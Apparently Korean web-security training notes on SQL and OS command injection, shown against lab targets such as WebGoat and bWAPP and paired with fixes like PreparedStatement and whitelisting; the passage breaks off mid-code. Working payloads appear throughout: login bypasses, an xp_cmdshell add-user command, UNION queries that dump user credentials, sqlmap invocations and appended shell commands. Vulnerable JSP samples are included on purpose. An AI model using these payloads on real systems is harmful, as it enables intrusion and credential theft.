  디스크에 저장되는 Disk Storage

* **쿠키의 속성 값을 처리하는 변수로 사용하면 안된다.**

  * 실습! - openeg/WebContent/hello.jsp, hello2.jsp 생성 아래와 같이 입력.

  hello.jsp

  ```jsp
  <%@ page language="java" contentType="text/html; charset=UTF-8"
      pageEncoding="UTF-8"%>
  <!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
  <html>
  <head>
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <title>Insert title here</title>
  </head>
  <body>
  	<%	// scriptly: JSP에서 동적 처리하는 부분을 기술할 떄 사용한다.
  	
  		// 요청 파라미터 목록으로부터 이름이 name인 파라미터의 값을 문자열로 가져오는 것
  		String pname = request.getParameter("name");
  	if (pname == null || pname.equals("")) {
  	%>
  		<form method="post" action-"hello.jsp">
  			<input type=""text" name="name" value="" autofocus>
  			<input type="submit" value="안녕">
  		</form>
  	<%		
  	} else {
  		// 파라미터로 전달된 값을 쿠키에 저장 및 화면 출력
  		Cookie c = new Cookie("cname", pname);
  		c.setDomain("localhost");
  		c.setPath("/openeg");
  		response.addCookie(c);
  		
  		// 세션에 저장
  		session.setAttribute("sname", pname);
  		
  		out.print(pname+"안녕!!!!!");
  	}
  	%>
  	
  	<a href="hello2.jsp">다시 안녕</a>
  </body>
  </html>
  ```

  

  hello2.jsp

  ```jsp
  <%@ page language="java" contentType="text/html; charset=UTF-8"
      pageEncoding="UTF-8"%>
  <!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
  <html>
  <head>
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <title>Insert title here</title>
  </head>
  <body>
  	<%	
  	String cname = "";
  	String sname = "";
  	
  	Cookie[] cs = request.getCookies();
  	
  	for (int i=0; i<cs.length; i++) {
  		if ("cname".equals(cs[i].getName())) {	
  			cname = cs[i].getValue();
  		}
  	}
  	
  	sname = (String)session.getAttribute("sname");
  	
  	%>
  	<hr>
  	<h3>쿠키로부터 >>> <%=cname %> 다시 아뇽~!</h3>
  	<hr>
  	<h3>세션로부터 >>> <%=sname %> 다시 아뇽~!</h3>
  	
  </body>
  </html>
  ```

  urlencoding.jsp

  ```jsp
  <%@ page language="java" contentType="text/html; charset=UTF-8"
      pageEncoding="UTF-8"%>
  <!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
  <html>
  <head>
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  </head>
  <body>
  	<%
  		String pcompany = request.getParameter("company");
  		if (pcompany == null) {
  			pcompany = "";
  		}
  		out.print("회사이름은 " + pcompany + "입니다.");
  	%>
  	<form>
  		<input type="text" name="company" value=""/>
  		<input type="submit"> 
  	</form>
  
  	<a href="?company=<%=pcompany%>">링크로 접근</a>
         <a href="?company=<%=java.net.URLEncoder.encode(pcompany, "UTF-8")%>">링크로 접근</a>
  </body>
  </html>
  ```

  htmlencoding.jsp

  ```jsp
  <%@ page language="java" contentType="text/html; charset=UTF-8"
      pageEncoding="UTF-8"%>
  <!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
  <html>
  <head>
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  </head>
  <body>
  	<%
  		String phtml = request.getParameter("html");
  		if (phtml == null) {
  			phtml = "";
  		}
  		out.print("입력한 내용은 " + phtml + "입니다.");
  	%>
  	<form>
  		<input type="text" name="html" value=""/>
  		<input type="submit"> 
  	</form>
  </body>
  </html>
  ```

  



##### 세션

* 웹 서버가 서버에 접근한 사용자를 식별하기 위한 방법
* 유일한 세션 아이디를 생성하여 접속한 사용자에게 할당하고 기억한다.
* 일정한 규칙없는, 비일관성 SessionID여야 한다. (SID 추측이 안되도록 한다.)
* Session ID
  * JSP: JSESSIONID
  * ASP: ASPSESSIONID
  * PHP: PHPSESSIONID



#### 인코딩 스키마

* 데이터가 잘 전달되도록 하기 위해 인코딩을 사용한다.
  (내가 의도한대로 오해없이, 오역없이 데이터가 전달되도록 하기 위해서)
* 일정한 규칙에 따라서 데이터를 변조하는 것
* 종류
  * ASCII
  * URL: 브라우저에서 서버로 정보를 전달하는데 사용.
  * HTML: 서버에서 브라우저로 내려보내는 문서를 안전하게 전달.
  * Base64





### 정규식 (Regular Expression. Regex)

* 특수문자를 메타 문자(Meta Character)라고 한다.

* [정규표현식 연습 https://www.regexpal.com/](https://www.regexpal.com/)

  * 휴대전화번호 찾기 정규식

  ```rexel
  [0-9][0-9][0-9]-[0-9][0-9][0-9][0-9]-[0-9][0-9][0-9][0-9]
  
  \d\d\d-\d\d\d\d-\d\d\d\d
  
  \d{3}-\d{4}-\d{4}
  
  01[016789]-\d{4}-\d{4}
  
  01(?:0|1|[6-9])-\d{4}-\d{4}
  
  01(?:0|1|[6-9])-\d{3,4}-\d{4}
  ```





##  Injection (삽입)

1. 입력값 검증 부재와 삽입
   ![img](https://t1.daumcdn.net/cfile/tistory/99A408355B4CB7F83A)

   - 규범화: 데이터를 손실 없이 가장 간단하면서 대등한 형태로 축소하는 과정
   - 정규화: 데이터를 손실이 발생하여도 가장 간단하고 잘 알려진 형태로 변환하는 과정

2. SQL Injection

   - 외부 입력값을 쿼리 조작 문자열 포함 여부를 검증하지 않고 쿼리 작성 및 실행에 사용하는 경우
     쿼리의 구조와 의미가 변경되어 실행되는 것
     - 데이터베이스 또는 데이터에 대해 공격 ⇒ 권한 밖의 데이터를 조회, 수정, 삭제, 생성
     - 서버에 대한 공격 ⇒ 데이터 베이스가 동작하는 서버의 제어권을 획득해서 원격지에서 해당 서버를 제어

   ```
   String ptext = request.getParameter("text");	// 검증 없이 SQL문을 사용
   String query = "select * from data where keyword = '" + ptext + "'";
   
   // 
   Statement stmt = connection.createStatement();
   stmt.executeQuery(query);
   ```

   * 정상적인 요청
     * search.jsp?text=abcd ⇒ select * from data where keyword = 'abcd'
       비정상적인 요청 유형 ⇒ SQL Injection 공격 유형
   * #1. 항상 참이 되는 입력 ⇒ 모든 내용이 반환 = 권한 밖의 데이터에 대해 접근이 가능
     ⇒ search.jsp?text=abcd' or 'a' = 'a ⇒ select * from data where keyword = 'abcd' or 'a' = 'a'
     ⇒ data 테이블에 모든 데이터를 조회해서 반환

### String SQL Injection

* #2 오류를 유발하는 입력 ⇒ 추가 공격을 위한 정보 수입
  ⇒ search.jsp?text=abcd'
  ⇒ select * from data where keyword = 'abcd''
  ⇒ 홑따움표의 개수가 일치하지 않아서 오류가 발생
  ⇒ 오류 메시지에 대한 처리가 불완전하여 시스템 내부 정보가 사용자 화면에 출력 될 수 있음
  * LAB@WinXP > Paros 실행 후 IE 브라우저로 WebGoat 사이트로 접속 ⇒ http://192.168.49.1:8080/WebGoat (webgoat / webgoat) > Injection Flaws > String SQL Injection 메뉴로 이동
    (사용자 계좌(계정)의 유효성을 체크해 주는 서비스)
    ![img](https://lh6.googleusercontent.com/8edG_W5s2q74ekLOfdlJMYsyPYh75m7KWn3R-eq93x2AJlfRQRqPHUXF5gT8kmjiLrbbf276c0vI7qkI1M6d_M-RgtZbm9htQDR7rlVjAJsI9GlqZLOJtu1Cd_T6LVG21P-T9wsh)

### Numeric SQL Inejction

* 선택한 지역의 날씨 정보를 출력해주는 서비스.
  WebGoat > Injection Flaws > Numeric SQL Inejction

![img](https://lh4.googleusercontent.com/YvLPx-EdsSvhNPLrT2d1XjhokTG-AlFO0RM9QVTqY2uGBoTKi44ed06lm6kQrdtudr3lSwob2hxIzUM55zvbu_ebcXBNoZ8PwZbuyLK9NecsX4AaDS_ln_h4TdBgItNwwP4QgeSP)

* Q. 모든 지역의 날씨 정보가 출력되도록 하시오.

* 과정
  [화면]지역을 선택: Seattle → station 파라미터의 값 102으로 지정
  [전달].../search.jsp?satation=102
  [처리]select * from weather where satation = 102

* 정답1.
  URL 주소의 요청 파라미터를 수정해서 직접 호출하는 방법http://192.168.49.1:8080/WebGoat/attack?Screen=75&menu=1100&station=102 or 1=1

* 정답2.
  Proxy를 이용해서 요청 파라미터를 수정해서 호출하는 방법station=102 or 1=1&SUBMIT=Go%21
  ![img](https://lh5.googleusercontent.com/JQHUMD9_uKFaArd2yNkHYgwbM-Z98IaJiU3EYEmT1ob5JO1pmdvZkGSaXAFDlj1o_FVlvgpvhMHTYmCHhJyci-B-6QkfS7n8Q_psXnuon8cJpO4P1QD4TYXrMre3LeKFvQLbEMvB)

  

* 정답3. 브라우저의 개발자 도구를 이용해서 파라미터의 값을 변경하여 서버로 전달

* Stage2.
  ![img](https://lh5.googleusercontent.com/JQHUMD9_uKFaArd2yNkHYgwbM-Z98IaJiU3EYEmT1ob5JO1pmdvZkGSaXAFDlj1o_FVlvgpvhMHTYmCHhJyci-B-6QkfS7n8Q_psXnuon8cJpO4P1QD4TYXrMre3LeKFvQLbEMvB)
  WebGoat > Injection Flaws > LAB: SQL Injection > Stage 1. String SQL Injection ![img](https://lh5.googleusercontent.com/-dsoFpWODlIQSPcr4_Vv8R678hbWxMB9ka9d1A0DyBsC-f06YaLdiaIJ-vGWeNSTNh3BHrHl3AUYVaXlkAlhXQLEveeV6HywM47bxeoj8vskAEZcTdXb2LLY9htFNpqLU8zNiIci)문제: Neville 사용자로 로그인 하시오.

  [화면]사용자 : Neville ⇒ employee_id 파라미터의 값으로 112가 선택패스워드 : a' or 'a' = 'a

  [전달] .../login.jsp?userid=112&password=a' or 'a' = 'a
  [처리] select * from users where userid = 112 and password = 'a' or 'a' = 'a'
  → 조회 결과가 있으면 → 로그인 성공
  → 조회 결과가 없으면 → 로그인 실패
  브라우저의 개발자 도구를 이용해서 클라이언트의 입력 값 제약 조건을 해제 후 공격 문자열을 입력, 전달한다.![img](https://lh5.googleusercontent.com/K-P0VWiGLX53U75I5rx8bqtr5uNL-cSQkWRlQb2Dpwfs5ucIMWGHbcIITvbXvQcEbpVa18H0KVpcjiAObUi5y3_jagdILsk-G41jL8pXGdnuNrOPOuJ4eSUAw_CySCNMU2nPYvY6)
  Proxy 도구를 이용해서 서버로 전달되는 중간에 값을 변경해서 전달하는 방법이 있다.![img](https://lh4.googleusercontent.com/scpuMyF2KObAhLl6HEDBXJ-PaQHIIQ7EQ6mmvosKI1OzctDfecOUSqjpCdNKqeTacv36l4izZNh2hJeUNx2GZJt1FHBv9j0sbSg7h_VdQ7UTjX_ZxQw-F65RUvrt3eiJNRjl7Z_g)

### Parameterized 이용하여 Query문 Injection 방지

Parameterized Query #1
문제 : State 1에서 사용된 소스의 문제점을 확인 후 안전한 방법으로 소스 코드를 수정 하시오

```java
// **진단 결과**
			// 외부 입력값 userID와 password를 검증하지 않고, SQL문 생성 및 실행에 사용하고 있다. => SQL Injection 취약!
			// 안전한 코드로 변경하는 방법
			// SQL문 쿼리문의 구조를 정의하고, 정의된 형태로만 실행되는 것을 보장 = 파라미터화된 쿼리 실행 = 구조화된 쿼리 실행
			// = PreparedStatement(미리 정의된) 객체를 이용해서 쿼리 실행
//			String query = "SELECT * FROM employee WHERE userid = " + userId + " and password = '" + password + "'";
//			// System.out.println("Query:" + query);
			
			// ###1 쿼리문의 구졸르 정의
			// 변수(입력값이 들어가는) 부분을 물음표(?)로 마킹한다.
			// 유의사항: 해당 컬럼의 데이터 타입을 고려하지 않는다.
				String query = "SELECT * FROM employee WHERE userid = ? and password = ?";

				try
	 			{
					// ###2 Statement 객체를 PreparedStatement 객체로 변경.
					// PreparedStatement 객체를 생성.
					// prepareStatement() 메소드를 이용해서 생성하고, 파라미터로 궈리문의 구조를 전달한다.
					
					java.sql.PreparedStatement answer_statement = WebSession.getConnection(s)
							.prepareStatement(query, ResultSet.TYPE_SCROLL_INSENSITIVE, ResultSet.CONCUR_READ_ONLY);
					
					// ###3 변수에 값으 ㄹ바인딩 후 쿼리를 실행한다.
					// 해당 컬럼의 데이터 타입을 고려해서 바인딩 함수를 사용한다.
					answer_statement.setInt(1, Integer.parseInt(userId));	// 문자를 숫자로 캐스킹 해준다.
					answer_statement.setString(2, password);
					// answer_statement를 생성할 때 Query문을 정의해줬기 때문에 아래에 query는 이제 필요없다.
					// ResultSet answer_results = answer_statement.executeQuery(query);
					ResultSet answer_results = answer_statement.executeQuery();
```

* #3. Stored Procedure를 호출하는 입력 ⇒ DB 서버의 제어권 탈취에 사용할 수 있다.
  ⇒ search.jsp?text=abcd'; exec xp_cmdshell 'net user hack hack /add'; --
  ⇒ select * from data where keyword = 'abcd'; exec xp_cmdshell 'net user hack hack /add'; --'

* #4. UNION 구문을 이용한 SQL Injection ⇒

  * UNION 할 테이블의 컬럼 개수가 같아야 한다.

  * 데이터 타입이 호환 가능해야 한다. → 값을 대입할 컬럼의 데이터 타입을 알아야 한다.

  * 공격자가 작성한 쿼리 구문을 통해 (내부 테이블의) 데이터가 유출 

  * UNION 구문 설명 ⇒ [https://zetawiki.com/wiki/SQL_UNION,_UNION_ALL_%EC%97%B0%EC%82%B0%EC%9E%90](https://zetawiki.com/wiki/SQL_UNION,_UNION_ALL_연산자)
    우편번호 조회 서비스
    http://70.12.50.56:9090/zipcode.asp?dong=하대동⇒ select * from address where dong = '하대동'
    우편번호 조회 서비스 결과에 공격자가 원하는 정보가 함께 출력되도록 입력값 조작
    select * from address where dong = '하대동' UNION select * from user --'
    ⇒ http://70.12.50.56:9090/zipcode.asp?dong=하대동' UNION select * from user --

    UNION 구문을 사용하기 위한 전제 조건컬럼의 개수와 데이터 타입이 동일해야 한다.
    ⇒ 정상 쿼리(우편번호 조회 쿼리) 실행을 통해서 반환되는 컬럼의 개수와 각 컬럼의 데이터 타입을 확인해야 한다.공격자가 원하는 정보를 포함하고 있는 테이블과 컬럼의 이름을 알고 있어야 한다.
    ⇒ 외부에서 (또는 검색을 통해서) 확인 가능한 DBMS의 시스템 테이블을 우선적으로 사용해야 한다.
    LAB 우편번호 조회 서비스를 이용해서 해당 사이트([http://70.12.50.56:9090](http://70.12.50.56:9090/zipcode.asp))의 계정을 탈취해서 로그인해 보세요.

    * #1 우편번호 조회 서비스를 통해서 반환하는 컬럼의 개수를 확인select * from address where dong = 'a' order by 1 --'
      ⇒ .../zip_code.asp?dong=a' order by 1 --
      ⇒ .../zip_code.asp?dong=a' order by 8 --
      Microsoft OLE DB Provider for SQL Server 오류 '80040e14'ORDER BY 위치 번호 8이(가) SELECT 목록의 항목 번호 범위를 벗어났습니다.
      /zip_search.asp, 줄 21→ 우편번호 조회 서비스를 위한 쿼리는 7개의 컬럼을 반환한다.
      ⇒ **Error-Based SQL Injection**
    * #2 UNION 구문을 이용해서 숫자로 구성된 7개의 값을 출력select * from address where dong = 'a' and 1=2 UNION select 1,2,3,4,5,6,7 --'
      ⇒ .../zip_code.asp?dong=a' and 1=2 UNION select 1,2,3,4,5,6,7 --
      Microsoft OLE DB Provider for SQL Server 오류 '80040e07'varchar 값 '110-753'을(를) 데이터 형식 int(으)로 변환하지 못했습니다.
      /zip_search.asp, 줄 21
    * #3 UNION 구문을 이용해서 해당 DBMS의 종류를 확인
      select * from address where dong = 'a' and 1=2 UNION select 1,db_name(),@@version,4,5,6,7 --' 
    * #4 MS-SQL의 시스템 테이블을 이용해서 해당 DB에서 사용하고 있는 사용자 테이블 목록을 조회
      https://docs.microsoft.com/ko-kr/sql/relational-databases/system-tables/system-base-tables?view=sql-server-2017https://docs.microsoft.com/ko-kr/sql/relational-databases/system-compatibility-views/sys-sysobjects-transact-sql?view=sql-server-2017
      select * from address where dong = 'a' and 1=2 UNION select 1,id,name,4,5,6,7 from sysobjects where xtype='U' --' 
    * #5 member 테이블의 컬럼 정보(이름)를 조회
      https://docs.microsoft.com/ko-kr/sql/relational-databases/system-compatibility-views/sys-syscolumns-transact-sql?view=sql-server-2017
      select * from address where dong = 'a' and 1=2 UNION select 1,name,3,4,5,6,7 from syscolumns where id=2073058421 --' 
      select * from address where dong = 'a' and 1=2 UNION select 1,name,3,4,5,6,7 from syscolumns where id=(select id from sysobjects where name='member') --' 
    * #6 member 테이블에 정보를 조회select * from address where dong = 'a' and 1=2 UNION select 1,bId,bName,bPass,bMail,bPhone,7 from member --' 

* #5 Blind SQL Injection

  * 참, 거짓에 따라 서버의 반응이 다른 것을 이용한 공격기법
  * WebGoat > Injection Flaws > Blind Numeric SQL Injection
    * 입력한 계정 번호(account number)의 유효성 검증을 수행해주는 서비스
      ![img](https://lh6.googleusercontent.com/9RHkyTjYvqvMKQ3OTMO8pDuJXGAIBwBdgh85otwd7vQ8BHShmh5s_TbSC3i6Cwz2LdoBkEEy0tDW4GPa8CX6J3nCdzKC82m5o21SbZFHRymgTUS4zlk1efMIAKgg51D4mfOGmQ7K)
    * 서버 내부 처리를 예측
      select * from account where account_no = 101
      ⇒ 결과가 있으면 → Account number is valid.
      ⇒ 결과가 없으면 → Invalid account number.
    * select * from account where account_no = 101 and 1=1
      ⇒ 결과가 있을 듯 → Account number is valid.
    * select * from account where account_no = 101 and 1=2
      ⇒ 결과가 없을 듯 → Invalid account number.
    * 내가 찾고자 하는 쿼리문을 추가 했을 때 옳은지 옳지 않은지 확인해볼 수 있다.
  * Q. pins 테이블에서 cc_number의 값이 1111222233334444인 pin 값을 구하시오
    * select pin from pins where cc_number='1111222233334444'
    * select * from account where account_no = 101 and (select pin from pins where cc_number='1111222233334444') = ???? (참인 값=2364)
      ⇒ 참 → Account number is valid.
      ⇒ 거짓 → Invalid account number.

### Blind String SQL Injection

* Q. WebGoat > Injection Flaws > Blind String SQL Injection
  pins 테이블에서 cc_number의 값이 4321432143214321인 name 컬럼의 값을 구하시오.
  * select * from accounts where account_no = 101 and (select substr(name,1,1) from pins where cc_number = '4321432143214321') = 'J'
  * select * from accounts where account_no = 101 and (select substr(name,2,1) from pins where cc_number = '4321432143214321') = 'i'
  * select * from accounts where account_no = 101 and (select substr(name,3,1) from pins where cc_number = '4321432143214321') = 'l'
  * select * from accounts where account_no = 101 and (select name from pins where cc_number = '4321432143214321') = 'Jill'
  * 숫자화 하여 범위 연삭
    select * from accounts where account_no = 101 and (select ascii(name) from pins where cc_number = '4321432143214321') = 74

### Union based SQL Injection

* Q.  bWAPP 접속하여 admin 탈취 (Union based SQL Injection)
  @Kali#2에서 브라우저 실행 후 http://Kali#1/bWAPP 로 접속 (bee / bug)![img](https://lh4.googleusercontent.com/3xzxgd72z-KJRAiXa8ITOtFJ67xjpHcrDy9tYoKqZCggprnfYIVwtOemziUAQ3TCY7m6rGWpTP-mHpXV4qqvYH9mM_S9Rue8w39vfWGSsgi7VgZRubAumt770sgxryZ60KO9pYaD)접속이 되지 않는 경우 @Kali#1에서 아래 명령어를 실행root@kali:~# service mysql startroot@kali:~# service apache2 start

  Choose your bug: SQL Injection (GET/Search) 선택 후 Hack 버튼 클릭![img](https://lh3.googleusercontent.com/Jl2p_SjcGoKmPWlcnSgEaMoEJDoYlAFMpqjjG-W0cZvuhTGSwmUMMQMRq0V-ovRGUEE2_H5Un-v9oib0-_L3mxb-CUMNjTqg3mH1PLEsOZ2N3uU3S4Md0HbFOo9lKej6BM0Yw4JD)영화 정보를 제공하는 서비스

  * man' 입력
    ⇒ Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '%'' at line 1 ⇒ … where title like '%man'%' ⇐ SQL Injection
  * #1 컬럼 개수 조회man' order by 1 #
    :man' order by 8 #Error: Unknown column '8' in 'order clause' 
    ⇒ 컬럼의 개수는 7개이다.
  * #2 UNION 구문을 이용해서 숫자를 출력
    man' and 1=2 union select 1,2,3,4,5,6,7 #
    Title Release Character Genre IMDb2 3 5 4 Link ⇐ 2, 3, 4, 5번째 컬럼 정보만 사용자 화면에 출력된다.
  * #3 UNION 구문을 이용해서 DB 정보를 조회
    man' and 1=2 union select 1,2,**version()**,4,5,6,7 #
  * #4 information_schema.tables 시스템 테이블을 이용해서 사용자 테이블을 조회
    man' and 1=2 union select 1,**table_name**,3,4,5,6,7 from **information_schema.tables** #
  * #5 users 테이블에 컬럼 정보를 조회 (information_schema.columns)man' and 1=2 union select 1,**column_name**,3,4,5,6,7 from **information_schema.columns where table_name = 'users'** #
  * #6 users 테이블에서 id, login, password, secret, email 정보를 조회man' and 1=2 union select 1,**id, login, password, concat(secret,' : ',email)**, 6, 7 from **users** #![img](https://lh6.googleusercontent.com/dEhj6ar1lJqRt9Aa8nqkjEyeJWJspT_bsKVEWKeCDLgTDgAg5KK-awdXIMm2XkdPDuaFM6j1h_3zjHE87mF-p0r1tt7UresWNzhDzFrTu0nrGk1KXLVNP6oY7yesKGSRGQMpKocb)
  * 암호화되어 있는 패스워드를 크래킹 = 6885858486f31043e5839c735d99457f045affd0
    https://crackstation.net/



#### sqlmap

* @Kali#2에서 터미널을 실행
  sqlmap -u "취약한 웹 페이지 주소" --cookie "세션 쿠키 값" --dbms취약한 웹 페이지 주소 ⇒ http://192.168.49.128/bWAPP/sqli_1.php?title=man&action=search 세션 쿠키 값 ⇒ PHPSESSID=nm1c5267j62bm755qh44kl2nc6; security_level=0
* sqlmap -u
  "http://192.168.49.128/bWAPP/sqli_1.php?title=man&action=search" --cookie "PHPSESSID=nm1c5267j62bm755qh44kl2nc6; security_level=0" --dbs  ⇐ 해당 서버의 db 목록 조회
* sqlmap -u "http://192.168.49.128/bWAPP/sqli_1.php?title=man&action=search" --cookie "PHPSESSID=nm1c5267j62bm755qh44kl2nc6; security_level=0" -D bWAPP --tables ⇐ bWAPP DB에 테이블 목록을 조회





## SQL Injection 방어기법

1. 입력값 검증
   - 외부 입력 값을 검증 후 쿼리문 생성 및 실행에 사용한다.
   - 공격적인 외부 입력 값: 쿼리 조작 문자열
   - 필터링이 요구되는 특수문자
   - 검증되지 않은 입력 값을 감지 되었을 때 **오류 처리**하는 것이 좋다.
2. 정적 쿼리를 사용한다. (= 구조화된 쿼리 실행 = 파라미터화된 쿼리 실행 = 입력값에 따라 쿼리문의 구조가 바뀌지 않도록 한다.)
   = **PreparedStatement** 객체를 이용해서 쿼리를 실행한다.
3. ORM Framework를 사용하는 경우, 외부 입력값을 쿼리맵(XML)에 바인딩 할 때 반드시 '#'기호를 이용한다.
4. 오류 메시지에 시스템 정보가 노출되지 않도록 한다.
   - Error를 이용한 공격을 예방하기 위함이다.
5. DB 사용자의 권한을 최소로 부여한다.
   - 해당 어플리케이션에서 사용하는 DB 객체에 대해서만 권한을 부여한다.)
   - Stored Procedure 또는 UNION-based SQL Injection 공격을 예방하기 위함이다.



### ORM FrameWork

* **객체 관계 매핑**(Object-relational mapping; ORM)은 데이터베이스와 객체 지향 프로그래밍 언어 간의 호환되지 않는 데이터를 변환하는 프로그래밍 기법이다. 객체 지향 언어에서 사용할 수 있는 "가상" 객체 데이터베이스를 구축하는 방법이다. 객체 관계 매핑을 가능하게 하는 상용 또는 무료 소프트웨어 패키지들이 있고, 경우에 따라서는 독자적으로 개발하기도 한다.

* XML(쿼리맵)

* 종류: iBatis, myBatis, Hibernate

* #은 변수처럼, $는 단순 문자결합

* 실습

  * #1 openeg 로그인 페이지a' 를 입력했을 때 나오는 오류 메시지 ⇒ 로그인 처리를 수행하는 쿼리맵 파일과 쿼리맵 ID를 확인.

    * Error Message
      --- The error occurred in **kr/co/openeg/lab/login/dao/login.xml**.  --- The error occurred while applying a parameter map.  --- Check the **login.loginCheck2**-InlineParameterMap.  --- Check the statement (query failed).
    * login.xml

    ```xml
    <select id="loginCheck2" parameterClass="LoginModel"
    		resultClass="LoginModel">
    		select
    		idx,
    		userId,
    		userPw,
    		userName,
    		joinDate
    		from board_member
    		<!-- 외부에서 입력되는 userId, userPw가 '$'기호를 이용해서 바인딩 되고 있으므로, 입력값 조작을 통한 SQL 
    			Injection 공격이 가능하다. 대응방법: 외부입력 값을 쿼리맵 변수에 바인딩할 떄 반드시 '#'기호를 이용한다. where userId 
    			= '$userId$' and userPw = '$userPw$' -->
    		where userId = #userId# and userPw = #userPw#
    	</select>
    ```

    



### PreparedStatement



### 운영체제 명령어 삽입 (Command Injection)

* 운영체제 명령어 실행 부분이 존재하는 경우외부 입력값을 검증, 제한 없이
  운영체제 명령어 실행 부분에 운영체제 명령어 또는 명령어의 일부로
  사용되는 경우 발생

* 외부 입력 값을 **검증 없이** 운영체제 명령어로 사용하는 경우

  ```
  String input = equest.getParameter("cmd");
  Runtime.getRuntime().exec(input);
  ```

  * 입력 값이 명령어로 사용됨
  * 정상 입력: .../doSomething.jsp?cmd=ls
  * 비정상 입력: .../doSomething.jsp?**cmd=ifconfig**
    ⇒ 의도하지 않은 명령어 실행이 가능해 지면서 서버의 **제어권이 탈취** 될 수 있다.

* 외부 입력 값을 검증 없이 운영체제 명령어의 일부로 사용하는 경우

  ```
  String input = equest.getParameter("data");
  Runtime.getRuntime().exec("cmd.exe /c type c:/data/" + input);
  ```

  * 입력 값이 명령어 실행에 필요한 파라미터로 사용됨
  * 정상 입력: .../doSomething.jsp?data=help.txt
    ⇒ c:\data\help.txt 내용 출력
  * 비정상 입력: .../doSomething.jsp?data=**help.txt &(%26) ipconfig**
    ⇒ help.txt 내용 출력 및 서버의 ip정보도 함께 출력 된다.
    ⇒ 의도치 않은 **추가 명령어 실행**이 가능하여 서버의 제어권이 탈취 될 수 있다.

* 코드 상에 'exec'라는 문구가 있으면 확인을 해보아야 한다.

* **제한 방법**

  * **White List**: 허용 목록
  * **Black List**: 제한 목록
  * 입력 값 유형 a, b, c, 중 a는 안전, b, c는 안전하지 않다.
    * 허용 목록: [a]
        입력 a, b, c ⇒ 출력 a
        입력 a, b, c, x, y ⇒ 출력 a
    * 제한 목록: [b, c]
        입력 a, b, c ⇒ 출력 a 
        입력 a, b, c, x, y ⇒ 출력 a, x, y
  * 검증되지 않은 새로운 유형에 대해서 방어할 수 없기 때문에 White List 방식을 추천한다.
  * **Black List 사용하는 경우**: 모집 합의 경우가 큰 경우
    Ex. 공항에서 입국하는 사람을 통제할 경우.. 전세계 사람을 일일이 허용할 수 없으니 Black List 방식을 사용한다.
  * IT에서는 입력 값을 제한할 수 있기 때문에 White List 방식을 주로 사용한다.

* **방어 기법** (원인 제거!)

  * 운영체제 명령어 **실행 구문의 필요성** 여부 및 대체 가능 여부를 판정한다.
  * 사용할 명령어를 미리 정의하고, 정의된 명령어만 사용되도록 한다. 
    (= White List 방식의 입력 값 제한)
  * 추가 명령에 실행에 사용되는 '**&**', '**|**', '**;**' 등의 문자를 입력 값 필터링 한다.

* 실습

  * WebGoat > Injection Flaws > Command Injection 도움말 제공 서비스

  * [화면] CSRF.help 파일을 선택 후 View 버튼을 클릭

  * [서버]
    exec("cmd.exe /c type \\**"** C:\FullstackLAB\\...\English\CSRF.html\\**"**")

    * Windows (요즘엔 Linux에서도) 폴더/파일 이름에 공백 문자를 포함하기 때문에 **""**으로 처리한다.

  * 파일이 아니라 왜 html로 받게 되는가?

    * Web에서는 파일을 html로 감싼다.

  * [화면]
    CSRF.help" & ipconfig 파일을 선택 후 View 버튼을 클릭

  * [서버]
    exec("cmd.exe /c type \\"C:\FullstackLAB\...\WebGoat\lesson_plans\English\\**CSRF.html" & ipconfig**\\"")

  * 개발자 도구를 이용해서 아래와 같이 값 변경

    ```html
    <option value="CSRF.help&quot; &amp;ipconfig">CSRF.help</option>
    ```

    * html Form 태그에서 입력 값을 기본적으로 URL Encording 처리를 한다.

      ```html
      <option >CSRF.help" & ipconfig</option>
      ```

      

  * Eclipse > testController.java > open

  ```java
  @RequestMapping(value = "/test/command_test.do", method = RequestMethod.POST)
  	@ResponseBody
  	public String testCommandInjection(HttpServletRequest request, HttpSession session) {
  		StringBuffer buffer = new StringBuffer();
  		
  		// 진단결과: 외부 입력값 dat를 검증, 제한하지 않고 운영체제 명령어 실행부분에 사용하고 있다.
  		// 		(= 운영체제 명령어 삽입 취약점에 노출되어 있다.)
  		
  		// 대응방법: 1)사용가능한 명령어를 미리 정의하고, 정의된 범위 내에서 명령어를 사용할 수 있도록 수정한다.
  		// 		  2) 서버로 전달되는 파라미터를 명령어 실행에 직접 사용하지 않도록 수정한다.
        
        // #1 사용 가능한 명령어를 미리 정의
  		String[] allowedCommands = { "type", "dir" };
  		
  		// #2 사용자 화면에서 전달되는 내용이 
  		//    명령어가 아닌 코드가 전달되도록 수정
  		//    type = 0 
  		//    dir  = 1 => test.jsp 에서 수정
  		
  		String data = request.getParameter("data");
  		
  		// #3 사용자 화면에서 넘어 온 코드를 실제 사용할 명령어로 맵핑
        try {
  			data = allowedCommands[Integer.parseInt(data)];
  		} catch (Exception e) {
           // 오류의 유형
           // 1. 숫자가 아닌 문자가 전달되는 경우 ⇒ 파싱 오류
           // 2. 0, 1이 안니 숫자가 전달되는 경우 ⇒ 배열 인덱스 오류
           return "비정상적인 오류입니다.";
        }
        
        
        if (data != null && data.equals("type")) {
  			// data 변수는 "type c:\...\files\\file1.txt" 형태의 값을 가지게 된다.
  			data = data + " " + request.getSession().getServletContext().getRealPath("/") + "files\\file1.txt";
  		}
  
  		Process process;
  		// cmd 에서 set명령어의 os 값을 확인한다.
  		String osName = System.getProperty("os.name");
  		// osName 확인
  		System.out.println("osName: "+ osName);
  		
  		String[] cmd;
  
  		if (osName.toLowerCase().startsWith("window")) {
  			cmd = new String[] { "cmd.exe", "/c", data };
  			for (String s : cmd)
  				System.out.print(s + " ");
  		} else {
  			cmd = new String[] { "/bin/sh", data };
  		}
  		try {
  			process = Runtime.getRuntime().exec(cmd);
  			InputStream in = process.getInputStream();
  			Scanner s = new Scanner(in);
  			buffer.append("실행결과: <br/>");
  			while (s.hasNextLine() == true) {
  				buffer.append(s.nextLine() + "<br/>");
  			}
  		} catch (IOException e) {
